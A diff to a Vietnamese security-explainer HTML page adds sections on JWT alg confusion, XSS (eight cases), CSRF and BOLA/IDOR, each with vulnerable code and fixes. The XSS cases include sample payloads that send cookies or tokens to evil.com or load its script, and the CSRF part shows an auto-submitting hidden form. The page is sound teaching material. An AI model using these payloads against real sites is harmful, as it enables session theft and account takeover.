@@ -84,19 +84,55 @@ table.tbl td code{word-break:break-word}
 pre.mermaid{background:#fff;border:1px solid var(--line);border-radius:8px;margin:14px 0;padding:14px;text-align:center;overflow:auto}
 pre.mermaid:not([data-processed="true"]){height:0;padding:0;margin:0;border:0;visibility:hidden}
 pre.mermaid svg{max-width:100%;height:auto}
+
+.toc{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:14px 16px;margin:0 0 22px}
+.toc h2{font:700 11.5px var(--mono);text-transform:uppercase;letter-spacing:.6px;color:var(--muted);margin:0 0 10px}
+.toc ol{margin:0;padding-left:0;list-style:none;counter-reset:t}
+.toc li{counter-increment:t;margin:4px 0}
+.toc a{display:flex;gap:10px;align-items:baseline;text-decoration:none;color:var(--ink);padding:3px 4px;border-radius:6px}
+.toc a:hover{color:var(--accent);background:var(--accent-soft)}
+.toc a::before{content:counter(t,decimal-leading-zero);font:700 12px var(--mono);color:var(--accent);min-width:22px}
+
+details.nest{border:1px solid var(--line);border-radius:8px;margin:10px 0;background:var(--code)}
+details.nest>summary{cursor:pointer;list-style:none;display:flex;align-items:center;gap:10px;padding:10px 12px;font:700 13.5px var(--mono);color:var(--ink)}
+details.nest>summary::-webkit-details-marker{display:none}
+details.nest>summary::after{content:"▾";margin-left:auto;color:var(--muted);transition:transform .2s}
+details.nest:not([open])>summary::after{transform:rotate(-90deg)}
+details.nest>summary:hover{color:var(--accent)}
+details.nest .nbody{padding:0 12px 10px}
+details.nest.case{background:var(--panel)}
+details.nest .cn{font:700 10.5px var(--mono);color:var(--accent);background:var(--accent-soft);border:1px solid var(--accent);border-radius:5px;padding:1px 7px;white-space:nowrap}
+.blk ol{margin:8px 0;padding-left:22px}
+.blk ol li{margin:10px 0}
 </style>
 </head>
 <body>
 <div class="wrap">
 <div class="top">
   <span class="t">~/sa/exp · giải thích</span>
-  <button class="btn" id="theme" type="button">◐ theme</button>
+  <div style="display:flex;gap:8px;flex-wrap:wrap">
+    <button class="btn" id="expandAll" type="button">+ mở hết</button>
+    <button class="btn" id="collapseAll" type="button">− đóng hết</button>
+    <button class="btn" id="theme" type="button">◐ theme</button>
+  </div>
 </div>
 
 <h1>Giải thích</h1>
 <p class="lead">Những câu hỏi nền tảng về bảo mật, trả lời ngắn gọn. Bấm tiêu đề để mở.</p>
 
-<details class="exp" id="exp-jwt" open>
+<nav class="toc">
+<h2>Mục lục</h2>
+<ol>
+<li><a href="#exp-jwt">JWT là gì?</a></li>
+<li><a href="#exp-https">HTTPS</a></li>
+<li><a href="#exp-hash">Băm password · SHA-256 vs Argon2id</a></li>
+<li><a href="#exp-xss">XSS</a></li>
+<li><a href="#exp-csrf">CSRF</a></li>
+<li><a href="#exp-bola">BOLA / IDOR</a></li>
+</ol>
+</nav>
+
+<details class="exp" id="exp-jwt">
 <summary><span class="qn">01</span><span>JWT là gì?</span></summary>
 <div class="body">
 <p>JWT là token gồm 3 phần <code>header.payload.signature</code> do server cấp sau khi đăng nhập, chứa danh tính và quyền của bạn. Nó <b>stateless</b>: server không lưu session, mỗi request chỉ cần kiểm tra token.</p>
@@ -148,10 +184,43 @@ pre.mermaid svg{max-width:100%;height:auto}
 <li>Ai cầm token hợp lệ vẫn dùng được tới khi hết hạn, nên <code>exp</code> ngắn (khoảng 15 phút) kèm refresh token.</li>
 <li>Khó thu hồi giữa chừng, và <code>role</code> trong token cũ không đổi cho tới khi token hết hạn.</li>
 </ul></div>
+
+<h3 style="font:700 16px var(--mono);color:var(--cyan);margin:22px 0 4px">Tin <code>alg</code> trong JWT · HS256 vs RS256</h3>
+
+<div class="blk"><h6>HS256 (đối xứng)</h6>
+<ul>
+<li>Không có phép &quot;mở chữ ký&quot;. Server tự tính lại <code>HMAC-SHA256(header.payload, secret)</code> rồi so với chữ ký trong token.</li>
+<li>Ai verify được thì cũng ký được, nên secret phải giữ kín ở mọi nơi verify.</li>
+</ul>
+</div>
+
+<div class="blk"><h6>RS256 (bất đối xứng)</h6>
+<ul>
+<li>Khóa bí mật ký, khóa công khai verify. Khóa công khai không cần giấu và không ký giả được.</li>
+<li>Hợp khi nhiều service cùng verify.</li>
+</ul>
+</div>
+
+<div class="blk warn"><h6>Nguy hiểm khi server tin <code>alg</code> trong token</h6>
+<div class="tbl-wrap"><table class="tbl">
+<thead><tr><th>Tấn công</th><th>Kẻ gian làm</th><th>Kết quả</th></tr></thead>
+<tbody>
+<tr><td><code>alg: none</code></td><td>Đặt <code>none</code>, bỏ chữ ký</td><td>Server bỏ qua kiểm tra, chấp nhận token</td></tr>
+<tr><td>Nhầm RS256 thành HS256</td><td>Đặt <code>HS256</code>, ký HMAC bằng khóa công khai (ai cũng có)</td><td>Server chuyển sang HS256, dùng khóa công khai làm secret, tính ra đúng chữ ký đó, chấp nhận token</td></tr>
+</tbody>
+</table></div>
+<p><b>Hậu quả của cả hai:</b> kẻ gian tự tạo token hợp lệ (giả bất kỳ user, nâng lên admin) mà không cần biết secret hay khóa bí mật.</p>
+</div>
+
+<div class="blk ok"><h6>Cách chặn</h6>
+<p>Server tự cố định thuật toán, không nghe <code>alg</code> của token.</p>
+<pre><code>jwt.verify(token, KEY, { algorithms: ['RS256'] });  // hoặc ['HS256'] nếu dùng HS256</code></pre>
+<p><b>Một dòng để nhớ:</b> <code>alg</code> trong token là dữ liệu do kẻ gian kiểm soát được, nên server chỉ được tin thuật toán nó đã cấu hình sẵn.</p>
+</div>
 </div>
 </details>
 
-<details class="exp" id="exp-https" open>
+<details class="exp" id="exp-https">
 <summary><span class="qn">02</span><span>HTTPS</span></summary>
 <div class="body">
 
@@ -266,7 +335,7 @@ sequenceDiagram
 </div>
 </details>
 
-<details class="exp" id="exp-hash" open>
+<details class="exp" id="exp-hash">
 <summary><span class="qn">03</span><span>Băm password: SHA-256 vs Argon2id</span></summary>
 <div class="body">
 
@@ -333,6 +402,100 @@ const ok = await argon2.verify(hash, passwordNhapVao);</code></pre>
 </div>
 </details>
 
+<details class="exp" id="exp-xss">
+<summary><span class="qn">04</span><span>XSS</span></summary>
+<div class="body">
+<p>XSS là mã của kẻ gian chạy <b>trong</b> site của bạn: dữ liệu do người khác kiểm soát (tin nhắn, từ khóa, URL, file, tên) bị đưa vào trang mà không escape, nên trình duyệt coi nó là mã và chạy cùng origin. Mã đó đọc được <code>document.cookie</code>, <code>localStorage</code> và gọi API với quyền của nạn nhân.</p>
+<div class="blk"><h6>So sánh nhanh</h6><div class="tbl-wrap"><table class="tbl"><thead><tr><th></th><th>XSS</th><th>CSRF</th></tr></thead><tbody><tr><td>Kẻ gian làm gì</td><td>Chạy mã JavaScript của nó <b>trong</b> trang của bạn</td><td>Mượn phiên đăng nhập để <b>gửi lệnh</b> thay nạn nhân</td></tr><tr><td>Lỗi nằm ở</td><td>Site không escape dữ liệu đưa vào trang</td><td>Site chỉ dựa vào cookie tự gửi để xác thực</td></tr><tr><td>Đọc được cookie và dữ liệu?</td><td>Có</td><td>Không, chỉ gây hành động</td></tr><tr><td>Chặn chính</td><td>Escape, CSP, HttpOnly</td><td>SameSite, CSRF token, xác nhận lại</td></tr></tbody></table></div></div>
+<details class="nest" id="xss-cases"><summary><span>XSS: 8 case cụ thể</span></summary>
+<div class="nbody">
+<details class="nest case"><summary><span class="cn">Case 1</span><span>Stored: chat, bình luận</span></summary>
+<div class="nbody">
+<div class="blk warn"><h6>Code lỗi (trang admin xem tin nhắn)</h6><pre><code>app.get('/admin/messages', async (req, res) =&gt; {
+  const [rows] = await db.execute('SELECT sender, body FROM messages');
+  res.send(`&lt;ul&gt;${rows.map(r =&gt; `&lt;li&gt;${r.sender}: ${r.body}&lt;/li&gt;`).join('')}&lt;/ul&gt;`);
+});</code></pre><p>Kẻ gian gửi tin: <code>&lt;img src=x onerror="new Image().src='https://evil.com/c?='+document.cookie"&gt;</code>. Tin được lưu như chuỗi bình thường. Admin mở trang, thẻ <code>&lt;img&gt;</code> lỗi tải nên chạy <code>onerror</code> và gửi cookie tới <code>evil.com</code>. Admin không phải bấm gì.</p></div><div class="blk ok"><h6>Sửa</h6><p>Render bằng React <code>{r.body}</code> (tự escape) hoặc escape thủ công (<code>&lt; thành &amp;lt;</code>), và đặt cookie phiên <code>HttpOnly</code>.</p></div>
+</div></details>
+<details class="nest case"><summary><span class="cn">Case 2</span><span>Stored: tên hiển thị, review, ticket (blind XSS)</span></summary>
+<div class="nbody">
+<div class="blk warn"><h6>Code lỗi (blind XSS qua ticket)</h6><p>Form hỗ trợ khách hàng, nội dung ticket hiện trên trang CSKH nội bộ. Kẻ gian gửi ticket có tiêu đề:</p><pre><code>Lỗi thanh toán &lt;script src="https://evil.com/x.js"&gt;&lt;/script&gt;</code></pre><p>Kẻ gian không thấy trang nội bộ, chỉ chờ. Khi nhân viên mở ticket, <code>x.js</code> chạy trong phiên của nhân viên (quyền cao hơn user thường), có thể gọi API nội bộ, xuất danh sách khách hàng hoặc tạo admin mới.</p></div><div class="blk ok"><h6>Sửa</h6><p>Escape ở mọi nơi hiển thị, kể cả trang nội bộ (nhiều người bỏ qua vì nghĩ nội bộ là an toàn). Thêm CSP <code>script-src 'self'</code> để script từ <code>evil.com</code> bị chặn.</p></div>
+</div></details>
+<details class="nest case"><summary><span class="cn">Case 3</span><span>Reflected: ô tìm kiếm</span></summary>
+<div class="nbody">
+<div class="blk warn"><h6>Code lỗi (reflected, ô tìm kiếm)</h6><pre><code>app.get('/search', (req, res) =&gt; {
+  res.send(`&lt;h1&gt;Kết quả cho: ${req.query.q}&lt;/h1&gt;`);
+});</code></pre><p>Link kẻ gian gửi qua email hoặc Zalo: <code>https://shop.example.com/search?q=&lt;script&gt;location='https://evil.com/?c='+document.cookie&lt;/script&gt;</code>. Nạn nhân bấm link (trông như link shop thật), server in nguyên <code>q</code> vào HTML và trình duyệt chạy script. Khác Stored ở chỗ mỗi nạn nhân phải bấm link, không lưu vào DB.</p></div><div class="blk ok"><h6>Sửa</h6><p>Escape <code>req.query.q</code> khi in ra, hoặc dùng template engine tự escape.</p></div>
+</div></details>
+<details class="nest case"><summary><span class="cn">Case 4</span><span>DOM-based</span></summary>
+<div class="nbody">
+<div class="blk warn"><h6>Code lỗi (DOM-based, phía client)</h6><pre><code>// shop.example.com/#An
+document.getElementById('welcome').innerHTML = 'Chào ' + decodeURIComponent(location.hash.slice(1));</code></pre><p>Link độc: <code>https://shop.example.com/#&lt;img src=x onerror=alert(document.domain)&gt;</code>. Phần sau <code>#</code> không bao giờ gửi lên server nên log và WAF không thấy gì, JavaScript của trang tự nhét nó vào <code>innerHTML</code>.</p></div><div class="blk ok"><h6>Sửa</h6><p>Dùng <code>textContent</code> thay <code>innerHTML</code>:</p><pre><code>document.getElementById('welcome').textContent = 'Chào ' + decodeURIComponent(location.hash.slice(1));</code></pre></div>
+</div></details>
+<details class="nest case"><summary><span class="cn">Case 5</span><span>Link javascript:</span></summary>
+<div class="nbody">
+<div class="blk warn"><h6>Code lỗi (link javascript:)</h6><pre><code>&lt;a href={user.website}&gt;Website của tôi&lt;/a&gt;</code></pre><p>Kẻ gian đặt website trong hồ sơ là <code>javascript:fetch('https://evil.com/?c='+document.cookie)</code>. React escape ký tự HTML nhưng không chặn giao thức <code>javascript:</code>, ai bấm link trong hồ sơ là chạy mã.</p></div><div class="blk ok"><h6>Sửa</h6><p>Chỉ chấp nhận <code>http:</code> và <code>https:</code>:</p><pre><code>const safeUrl = (u) =&gt; {
+  try { const p = new URL(u).protocol; return (p === 'http:' || p === 'https:') ? u : '#'; }
+  catch { return '#'; }
+};</code></pre></div>
+</div></details>
+<details class="nest case"><summary><span class="cn">Case 6</span><span>File upload (SVG, HTML)</span></summary>
+<div class="nbody">
+<div class="blk warn"><h6>Code lỗi (file upload SVG/HTML)</h6><p>Nhận avatar theo đuôi file do client khai, giữ tên gốc, phục vụ cùng domain với app. Kẻ gian upload <code>avatar.svg</code>:</p><pre><code>&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;script&gt;fetch('https://evil.com/steal',{method:'POST',body:localStorage.getItem('accessToken')})&lt;/script&gt;
+&lt;/svg&gt;</code></pre><p>Gửi link <code>https://app.example.com/uploads/avatar.svg</code> cho nạn nhân. Mở <b>trực tiếp</b> link này thì trình duyệt chạy script ở origin của app và đọc được <code>localStorage</code>. (Nhúng bằng <code>&lt;img src&gt;</code> thì script không chạy.)</p></div><div class="blk ok"><h6>Sửa</h6><p>Chỉ nhận PNG/JPEG (kiểm magic bytes, re-encode bằng sharp), đặt tên ngẫu nhiên, phục vụ từ domain riêng kèm <code>X-Content-Type-Options: nosniff</code> và <code>Content-Disposition: attachment</code>.</p></div>
+</div></details>
+<details class="nest case"><summary><span class="cn">Case 7</span><span>Markdown, rich text</span></summary>
+<div class="nbody">
+<div class="blk warn"><h6>Code lỗi (Markdown / rich text)</h6><p>App cho viết mô tả sản phẩm bằng Markdown và render bằng thư viện cho phép HTML thô. Kẻ gian viết:</p><pre><code>Sản phẩm tốt! &lt;img src=x onerror="fetch('https://evil.com/?c='+document.cookie)"&gt;</code></pre><p>Thư viện giữ nguyên thẻ HTML, khách vào trang sản phẩm là dính.</p></div><div class="blk ok"><h6>Sửa</h6><p>Tắt HTML thô trong thư viện Markdown, hoặc lọc kết quả bằng DOMPurify:</p><pre><code>const clean = DOMPurify.sanitize(marked.parse(userMarkdown));</code></pre></div>
+</div></details>
+<details class="nest case"><summary><span class="cn">Case 8</span><span>WebView trong React Native</span></summary>
+<div class="nbody">
+<div class="blk warn"><h6>Code lỗi (WebView React Native)</h6><pre><code>&lt;WebView source={{ html: `&lt;div&gt;${message.body}&lt;/div&gt;` }} /&gt;</code></pre><p>Kẻ gian gửi tin chứa <code>&lt;img src=x onerror="window.ReactNativeWebView.postMessage(document.cookie)"&gt;</code>. Mã chạy trong WebView, và nếu app xử lý <code>onMessage</code> thiếu kiểm tra thì mã của kẻ gian có thể kích hoạt hành động của app.</p></div><div class="blk ok"><h6>Sửa</h6><p>Escape dữ liệu trước khi nhúng vào HTML của WebView, tắt JavaScript nếu không cần, kiểm tra và giới hạn các message nhận từ WebView.</p></div>
+</div></details>
+</div></details>
+<div class="blk ok"><h6>XSS · các lớp phòng thủ chung</h6><p>Mọi case trên giống nhau ở chỗ dữ liệu không đáng tin được chèn vào ngữ cảnh có thể chạy mã (HTML, thuộc tính, URL, JavaScript), nên cách phòng cũng chung.</p><ol><li><b>Escape theo ngữ cảnh</b> khi xuất ra. React tự escape <code>{body}</code>, nhưng <code>dangerouslySetInnerHTML</code>, <code>innerHTML</code> và <code>document.write</code> thì không.</li><li><b>Sanitize khi cần HTML thật</b> (Markdown, rich text): lọc bằng DOMPurify.</li><li><b>Chỉ cho phép URL <code>http:</code> và <code>https:</code></b> trong <code>href</code>.</li><li><b>Upload file</b>: whitelist loại file theo magic bytes, re-encode ảnh, tên ngẫu nhiên, phục vụ từ domain riêng.</li><li><b>Content-Security-Policy</b>: chặn script lạ và chặn gửi dữ liệu tới domain lạ (lớp phòng thủ thứ hai).</li><li><b>Cookie phiên <code>HttpOnly</code></b>: JavaScript không đọc được <code>document.cookie</code>. Đừng để token nhạy cảm ở <code>localStorage</code> nếu tránh được.</li><li><b>WebView</b>: escape trước khi nhúng, tắt JavaScript nếu không cần, giới hạn message từ WebView.</li></ol></div>
+</div>
+</details>
+
+<details class="exp" id="exp-csrf">
+<summary><span class="qn">05</span><span>CSRF</span></summary>
+<div class="body">
+<p>CSRF là kẻ gian mượn phiên đăng nhập của nạn nhân để gửi lệnh. Nguyên lý: trình duyệt tự gắn cookie vào mọi request tới site, kể cả request do trang khác kích hoạt, nên kẻ gian ép nạn nhân đã đăng nhập gửi lệnh mà họ không hay biết.</p>
+<div class="blk warn"><h6>Code lỗi · xác thực chỉ bằng cookie</h6><pre><code>app.post('/api/account/email', requireLogin, async (req, res) =&gt; {
+  await db.execute('UPDATE users SET email = ? WHERE id = ?', [req.body.email, req.user.id]);
+  res.sendStatus(200);
+});</code></pre><p>Trang <code>evil.com</code> chứa form ẩn tự gửi:</p><pre><code>&lt;form action="https://bank.example.com/api/account/email" method="POST" id="f"&gt;
+  &lt;input name="email" value="hacker@evil.com"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit()&lt;/script&gt;</code></pre></div>
+<div class="blk"><h6>Diễn biến</h6><ol class="flow"><li>Nạn nhân đã đăng nhập <code>bank.example.com</code>.</li><li>Nạn nhân mở <code>evil.com</code> (qua link trong tin nhắn).</li><li>Trình duyệt gửi POST tới bank <b>kèm cookie phiên</b>.</li><li>Server đổi email. Kẻ gian dùng "quên mật khẩu" gửi link về email mới để chiếm tài khoản.</li></ol><p><b>Lưu ý:</b> ví dụ này chỉ chạy khi site thiếu đồng thời <code>SameSite</code>, CSRF token và bước xác nhận lại. Trình duyệt hiện đại mặc định <code>SameSite=Lax</code> nên CSRF kiểu này hiếm hơn trước, nhưng vẫn gặp ở app cũ, cookie <code>SameSite=None</code>, endpoint dùng GET để đổi dữ liệu, hoặc khi một subdomain bị chiếm.</p></div>
+<div class="blk ok"><h6>Cách khắc phục</h6><ol><li><b>Cookie <code>SameSite=Lax</code> hoặc <code>Strict</code></b> cho cookie phiên: trình duyệt không gửi cookie trong request từ trang khác.<pre><code>res.cookie('sid', sessionId, { httpOnly: true, secure: true, sameSite: 'lax' });</code></pre></li><li><b>CSRF token</b>: server cấp token ngẫu nhiên gắn với phiên, mọi request thay đổi dữ liệu phải gửi kèm. Trang của kẻ gian không biết giá trị nên không giả được.<pre><code>if (req.body._csrf !== req.session.csrfToken) return res.sendStatus(403);</code></pre></li><li><b>Kiểm tra header <code>Origin</code> hoặc <code>Referer</code></b>: từ chối request thay đổi dữ liệu có origin không thuộc danh sách của mình.</li><li><b>Đòi xác nhận lại</b> (mật khẩu hiện tại, OTP) cho đổi email, đổi mật khẩu, chuyển tiền. Ở ví dụ trên, đòi mật khẩu cũ thì kẻ gian không đổi được email.</li><li><b>Không dùng GET để đổi dữ liệu</b>: nếu có <code>GET /api/transfer?to=...</code> thì một thẻ <code>&lt;img&gt;</code> cũng đủ kích hoạt.</li><li><b>SPA và mobile</b>: dùng header <code>Authorization: Bearer &lt;token&gt;</code> thay cookie, request từ trang lạ không tự mang token nên gần như không dính CSRF.</li></ol></div>
+<div class="blk"><h6>CORS không chặn được CSRF</h6><p>CORS là cơ chế của trình duyệt quyết định JavaScript ở origin khác <b>có được đọc phản hồi</b> hay không. Nó không quyết định request có được <b>gửi đi</b> hay không.</p><ul><li>Form HTML là điều hướng bình thường, không qua CORS. Trình duyệt gửi request kèm cookie, server xử lý xong (đổi email xong) thì trình duyệt mới thấy phản hồi.</li><li>"Simple request" (<code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code>, <code>text/plain</code>) được gửi thẳng, không cần preflight.</li><li>CSRF không cần đọc phản hồi, chỉ cần hành động xảy ra.</li></ul><p>"Đọc phản hồi" là dòng như <code>const data = await res.json()</code> trên trang <code>evil.com</code>. CORS chặn dòng đó (server vẫn trả dữ liệu nhưng trình duyệt giấu khỏi JavaScript), còn việc server đã thực hiện lệnh thì không bị hủy.</p><p>Chỗ CORS giúp được một phần: nếu API chỉ nhận <code>application/json</code>, <code>fetch</code> cross-site phải qua preflight và bị chặn nếu server không cho origin lạ. Nhưng cách này dễ sai cấu hình và không bảo vệ endpoint nhận form hay endpoint GET đổi dữ liệu, nên không dựa vào đó.</p><p><b>CORS cấu hình sai còn tệ hơn:</b> phản chiếu mọi origin kèm <code>Access-Control-Allow-Credentials: true</code> cho phép trang của kẻ gian gọi API với cookie của nạn nhân và đọc phản hồi, nghiêm trọng hơn CSRF. Dùng danh sách origin cố định.</p><p>CORS được cấu hình ở <b>server</b> bằng header phản hồi (Express <code>cors</code>, nginx, API Gateway, S3/CloudFront), chỉ đặt ở một tầng để header không bị trùng. Trình duyệt là bên thực thi, nên app React Native, Postman, curl không bị CORS ràng buộc.</p></div>
+<div class="blk ok"><h6>Điều cần nhớ</h6><ul><li><b>XSS nguy hiểm hơn</b>: mã của kẻ gian chạy trong site của bạn nên vượt qua cả CSRF token và đọc được dữ liệu. Chặn bằng escape, sanitize, CSP, HttpOnly.</li><li><b>CSRF chỉ gây hành động</b> thay nạn nhân, không đọc được dữ liệu. Chặn bằng SameSite, CSRF token, xác nhận lại.</li><li>Có XSS thì kẻ gian lấy được CSRF token rồi làm CSRF thoải mái, nên phải chặn XSS trước.</li><li>CORS bảo vệ việc <b>đọc</b> dữ liệu giữa các origin, không thay được hai lớp trên.</li></ul><p style="color:var(--muted);font-size:14px">Các payload chỉ để hiểu cơ chế. Muốn thực hành, hãy làm trên lab của bạn: OWASP Juice Shop (các bài XSS) và DVWA cho CSRF.</p></div>
+</div>
+</details>
+
+<details class="exp" id="exp-bola">
+<summary><span class="qn">06</span><span>BOLA / IDOR</span></summary>
+<div class="body">
+<p><b>Là gì:</b> <b>BOLA</b> (Broken Object Level Authorization) và <b>IDOR</b> (Insecure Direct Object Reference) là cùng một lỗi. Server cho người dùng truy cập một đối tượng (đơn hàng, tin nhắn, hồ sơ...) chỉ vì họ gửi đúng ID, mà <b>không kiểm tra đối tượng đó có thuộc về họ không</b>. IDOR là tên cũ của web, BOLA là tên OWASP dùng cho API (số 1 trong API Top 10).</p><p><b>Xác thực khác phân quyền:</b> JWT và đăng nhập chỉ trả lời "bạn là ai". Lỗi này nằm ở câu hỏi còn lại: "bạn có quyền với <b>đúng đối tượng này</b> không".</p>
+<div class="blk warn"><h6>Ví dụ</h6><p>Alice xem đơn của mình, rồi đổi số trên URL:</p><pre><code>GET /api/orders/1001   -&gt; đơn của Alice
+GET /api/orders/1002   -&gt; đơn của Bob, server vẫn trả về</code></pre><p>Kẻ gian chạy vòng lặp <code>1..100000</code> là lấy được dữ liệu mọi người.</p><p><b>Code lỗi</b></p><pre><code>app.get('/api/orders/:id', requireLogin, async (req, res) =&gt; {
+  const [rows] = await db.execute('SELECT * FROM orders WHERE id = ?', [req.params.id]);
+  res.json(rows[0]);   // không kiểm tra chủ sở hữu
+});</code></pre><p>Dù đã tham số hóa (chống SQL injection) và đã có JWT, lỗi vẫn còn.</p></div>
+<div class="blk ok"><h6>Cách sửa</h6><p>Ràng buộc theo chủ sở hữu, lấy <code>user_id</code> từ <b>token đã verify</b>, không tin giá trị client gửi.</p><pre><code>const [rows] = await db.execute(
+  'SELECT * FROM orders WHERE id = ? AND user_id = ?',
+  [req.params.id, req.user.id]
+);
+if (!rows.length) return res.sendStatus(404);</code></pre></div>
+<div class="blk"><h6>Vì sao trả 404 thay vì 403</h6><p>Nếu trả khác nhau, mã trạng thái tự nó là một tín hiệu:</p><pre><code>GET /api/orders/1002   -&gt; 403   (có đơn này, nhưng không phải của bạn)
+GET /api/orders/9999   -&gt; 404   (không có đơn này)</code></pre><p>Kẻ gian không đọc được nội dung, nhưng biết được <b>ID nào tồn tại</b>, quy mô hệ thống, và đối tượng nào đáng nhắm tới. Với dữ liệu như email hay tài khoản, chỉ riêng việc xác nhận "có tài khoản này" đã giúp phishing hoặc đoán mật khẩu. Đây là lỗi <b>lộ thông tin qua phản hồi (enumeration)</b>.</p><p>Trả <b>404 cho cả hai trường hợp</b> thì phản hồi giống hệt nhau, kẻ gian không phân biệt được "không có" với "có nhưng không phải của bạn". Câu truy vấn đã ràng buộc <code>AND user_id = ?</code> ở trên làm điều này tự nhiên: cả hai trường hợp đều ra rỗng.</p></div>
+<div class="blk warn"><h6>Lưu ý</h6><ul><li><b>Phản hồi phải giống nhau cả về nội dung và thời gian xử lý</b>, nếu một nhánh nhanh hơn hẳn thì kẻ gian vẫn phân biệt được.</li><li><b>403 vẫn đúng</b> khi ID là thông tin công khai (ví dụ <code>/products/5</code>) hoặc người dùng đã biết đối tượng tồn tại và chỉ bị hạn chế một hành động. Quy tắc 404 áp dụng khi <b>sự tồn tại của đối tượng cũng là thông tin nhạy cảm</b>.</li><li><b>UUID</b> chỉ làm khó đoán ID, không thay việc kiểm tra quyền.</li><li>Áp dụng cho <b>mọi thao tác</b>, không chỉ đọc: sửa, xóa, tải file, endpoint con như <code>/orders/1002/invoice</code>.</li><li>Biến thể <b>BFLA</b> (Function Level): user thường gọi được endpoint của admin như <code>DELETE /api/users/5</code>.</li><li>Mẹo cùng ý tưởng: màn hình đăng nhập báo chung "sai email hoặc mật khẩu", không báo riêng "email không tồn tại".</li></ul></div>
+<div class="blk ok"><h6>Một dòng để nhớ</h6><p>Mỗi lần truy cập một đối tượng, server phải tự hỏi "người này có quyền với đúng đối tượng này không", và khi trả lời "không" thì không để lộ đối tượng đó có tồn tại hay không.</p></div>
+</div>
+</details>
+
 </div>
 <script>
 (function(){
@@ -351,6 +514,13 @@ async function run(scope){
 }
 window.addEventListener('load',function(){ run(document); });
 document.querySelectorAll('details.exp').forEach(function(d){ d.addEventListener('toggle',function(){ if(d.open) run(d); }); });
+function openTarget(id){ if(!id) return; var el=document.getElementById(id); if(el && el.tagName==='DETAILS'){ el.open=true; run(el); el.scrollIntoView({behavior:'smooth',block:'start'}); } }
+window.addEventListener('hashchange',function(){ openTarget(location.hash.slice(1)); });
+document.querySelectorAll('.toc a').forEach(function(a){ a.addEventListener('click',function(){ openTarget(a.getAttribute('href').slice(1)); }); });
+var ea=document.getElementById('expandAll'), ca=document.getElementById('collapseAll');
+if(ea) ea.addEventListener('click',function(){ document.querySelectorAll('details.exp').forEach(function(d){ d.open=true; }); run(document); });
+if(ca) ca.addEventListener('click',function(){ document.querySelectorAll('details.exp').forEach(function(d){ d.open=false; }); });
+window.addEventListener('load',function(){ openTarget(location.hash.slice(1)); });
 </script>
 </body>
 </html>
